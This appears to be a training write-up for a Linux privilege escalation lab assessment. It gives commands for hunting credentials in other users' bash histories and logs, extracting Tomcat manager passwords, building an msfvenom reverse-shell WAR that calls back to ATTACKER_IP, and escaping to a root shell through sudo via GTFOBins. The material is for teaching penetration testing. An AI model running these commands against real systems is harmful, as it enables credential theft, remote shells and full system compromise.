# 🎯 Skills Assessment - Practical Exercises

## 🎯 Overview

This skills assessment covers comprehensive Linux privilege escalation methodology through five practical scenarios demonstrating key techniques: hidden file discovery, credential hunting, group privilege abuse, Tomcat exploitation, and sudo misconfiguration abuse.

## 📋 Assessment Methodology

### Phase 1: Initial Enumeration & Hidden File Discovery

**Objective**: Establish foothold and discover hidden files containing sensitive information

#### Connection and Basic Enumeration
```bash
# Connect to target system
ssh htb-student@TARGET_IP

# Basic situational awareness
whoami
id
hostname
uname -a
```

#### Hidden File Discovery
```bash
# List hidden files and directories with details
ls -lA

# Look for configuration directories
ls -lA .config/

# Search for hidden files containing flags or sensitive data
find . -name ".*" -type f -exec ls -la {} \; 2>/dev/null
```

**Key Findings**: Hidden configuration files often contain sensitive information that can provide initial access or credentials for lateral movement.

---

### Phase 2: Credential Hunting in Command History

**Objective**: Extract credentials from bash history files for user escalation

#### Bash History Analysis
```bash
# Check current user's history
cat ~/.bash_history

# Investigate other users' history files
cat /home/*/bash_history 2>/dev/null
```

#### Systematic Credential Search
```bash
# Search for passwords in history files
grep -i "password\|pass\|pwd\|secret" /home/*/.bash_history 2>/dev/null

# Look for SSH commands with passwords
grep -i "ssh.*pass" /home/*/.bash_history 2>/dev/null

# Search for database connections
grep -i "mysql.*-p" /home/*/.bash_history 2>/dev/null
```

#### User Switching
```bash
# Test discovered credentials
su target_user
# Enter discovered password

# Verify access and read user-specific files
cat /home/target_user/sensitive_file.txt
```

**Key Learning**: Command history files are goldmines for credential discovery - administrators often leave passwords in command line history during troubleshooting or automation tasks.

---

### Phase 3: Group Privilege Exploitation

**Objective**: Leverage group memberships for accessing restricted files and directories

#### Group Membership Analysis
```bash
# Check current user's group memberships
id
groups

# Analyze group privileges
getent group adm
getent group disk
getent group docker
getent group lxd
```

#### ADM Group Exploitation
```bash
# ADM group provides access to log files
ls -la /var/log/

# Read system logs for sensitive information
find /var/log -readable 2>/dev/null

# Search logs for passwords or credentials
grep -r "password\|secret" /var/log/ 2>/dev/null
```

**Key Insight**: Group memberships like `adm`, `disk`, `docker`, and `lxd` provide elevated access to system resources that can lead to privilege escalation.

---

### Phase 4: Web Application Service Exploitation

**Objective**: Identify internal web services and exploit application manager interfaces for remote code execution

#### Internal Service Discovery
```bash
# Enumerate listening ports
netstat -tulpn | grep LISTEN
ss -tulpn

# Check for web services
curl -I http://localhost:8080
curl -I http://localhost:80
```

#### Tomcat Manager Interface Attack
```bash
# Hunt for Tomcat configuration files
find /etc -name "*tomcat*" -type f 2>/dev/null
find /etc -name "*tomcat*" -type d 2>/dev/null

# Search for backup configuration files
ls -la /etc/tomcat9/
cat /etc/tomcat9/*.bak

# Extract credentials from configuration
grep -i "password\|user" /etc/tomcat9/tomcat-users.xml.bak
```

#### WAR File Upload Attack
```bash
# Generate malicious WAR file
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=ATTACKER_IP \
  LPORT=LISTENER_PORT \
  -f war -o malicious.war

# Setup reverse shell listener
nc -nlvp LISTENER_PORT

# Deploy WAR via manager interface:
# 1. Login to http://target:8080/manager/html
# 2. Upload malicious.war file
# 3. Click deployed application to trigger shell
```

**Critical Technique**: Internal web services often have weak authentication and provide high-privilege execution contexts for immediate system compromise.

---

### Phase 5: Sudo Misconfiguration Exploitation

**Objective**: Abuse sudo permissions with GTFOBins techniques for root privilege escalation

#### Sudo Permission Enumeration
```bash
# Check sudo privileges
sudo -l

# Look for NOPASSWD entries
sudo -l | grep "NOPASSWD"

# Identify allowed commands
sudo -l | grep -E "\(root\)"
```

#### GTFOBins Sudo Exploitation
```bash
# For busctl sudo permissions
sudo busctl --show-machine
# In busctl pager prompt:
!/bin/bash

# Other common GTFOBins exploits:
# vim: sudo vim -c ':!/bin/bash'
# nano: Ctrl+R Ctrl+X -> reset; bash 1>&0 2>&0  
# find: sudo find . -exec /bin/bash \; -quit
# less: sudo less /etc/passwd -> !/bin/bash
```

#### Shell Upgrade
```bash
# Upgrade dumb shell to interactive TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Alternative upgrade methods
script /dev/null
stty raw -echo; fg; reset; export SHELL=/bin/bash; export TERM=screen
```

**Essential Knowledge**: Sudo misconfigurations with GTFOBins-listed binaries provide immediate root access - always cross-reference sudo permissions with GTFOBins database.

---

## 🔧 Assessment Techniques Summary

### 1. Hidden File Discovery
- **Technique**: `ls -lA` and recursive hidden file enumeration
- **Target**: Configuration directories and hidden files containing credentials
- **Impact**: Initial access and sensitive information disclosure

### 2. Credential Hunting
- **Technique**: Bash history analysis and systematic credential search
- **Target**: Command history files across user directories
- **Impact**: User account compromise and lateral movement

### 3. Group Privilege Abuse
- **Technique**: Group membership analysis and restricted resource access
- **Target**: ADM, disk, docker, lxd group memberships
- **Impact**: System file access and container privilege escalation

### 4. Web Service Exploitation
- **Technique**: Internal service discovery and manager interface attack
- **Target**: Tomcat manager with WAR file upload functionality
- **Impact**: Remote code execution with service account privileges

### 5. Sudo Rights Exploitation
- **Technique**: GTFOBins sudo command abuse
- **Target**: Misconfigured sudo permissions for system utilities
- **Impact**: Direct root privilege escalation

---

## 🛠️ Tools and Commands Used

### Enumeration
```bash
ls -lA                    # Hidden file discovery
netstat -tulpn           # Network service enumeration  
sudo -l                  # Sudo permission analysis
id / groups              # Group membership check
find / -name "pattern"   # File system search
```

### Exploitation
```bash
su username              # User switching with discovered credentials
msfvenom                 # Malicious payload generation
nc -nlvp PORT           # Reverse shell listener
python3 -c 'import pty; pty.spawn("/bin/bash")'  # Shell upgrade
```

### Post-Exploitation
```bash
cat /path/to/flag        # Flag retrieval
sudo busctl --show-machine  # GTFOBins exploitation
!/bin/bash               # Pager escape sequences
```

---

## 🎯 Learning Objectives Achieved

### Technical Skills
- **Systematic Enumeration** - Hidden files, services, permissions
- **Credential Discovery** - History files, configuration files
- **Group Exploitation** - ADM group log access
- **Web Application Attack** - Tomcat manager exploitation
- **Sudo Abuse** - GTFOBins privilege escalation

### Methodology Mastery
- **Progressive Escalation** - Each flag builds on previous access
- **Multiple Attack Vectors** - Diverse privilege escalation techniques
- **Tool Integration** - Manual enumeration with automated tools
- **Persistence Awareness** - Maintaining access through multiple methods

### Professional Skills
- **Documentation** - Systematic approach to findings
- **Tool Proficiency** - msfvenom, netcat, GTFOBins
- **Problem Solving** - Adapting techniques to specific environments
- **Security Awareness** - Understanding defensive implications

---

## 📚 Next Steps

After completing this skills assessment:

1. **Practice Automation** - Script common enumeration techniques
2. **Advanced Exploitation** - Kernel exploits and container escapes  
3. **Stealth Techniques** - Avoiding detection during privilege escalation
4. **Persistence Methods** - Maintaining elevated access
5. **Reporting Skills** - Professional documentation of findings

**💡 Key Takeaway**: Successful Linux privilege escalation requires systematic enumeration, diverse technique knowledge, and the ability to chain multiple attack vectors for complete system compromise. 